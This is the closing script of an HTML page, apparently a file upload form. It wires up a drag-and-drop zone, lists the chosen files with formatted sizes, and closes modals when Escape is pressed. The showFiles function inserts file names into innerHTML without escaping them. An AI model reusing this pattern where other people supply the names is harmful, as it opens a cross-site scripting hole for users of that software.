            dropZone.addEventListener(ev, function(e) { e.preventDefault(); e.stopPropagation(); dropZone.classList.remove('dragover'); });
        });
        dropZone.addEventListener('drop', function(e) {
            fileInput.files = e.dataTransfer.files;
            showFiles(e.dataTransfer.files);
        });
    }
    if (fileInput) {
        fileInput.addEventListener('change', function() { showFiles(this.files); });
    }
    function showFiles(files) {
        var html = '';
        for (var i = 0; i < files.length; i++) {
            html += '📎 ' + files[i].name + ' (' + formatSize(files[i].size) + ')<br>';
        }
        if (fileList) fileList.innerHTML = html;
    }
    function formatSize(b) {
        if (b >= 1073741824) return (b/1073741824).toFixed(1)+' GB';
        if (b >= 1048576) return (b/1048576).toFixed(1)+' MB';
        if (b >= 1024) return (b/1024).toFixed(1)+' KB';
        return b+' B';
    }

    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape') {
            document.querySelectorAll('.modal-overlay.show').forEach(function(m) { m.classList.remove('show'); });
        }
    });
    </script>
</body>
</html>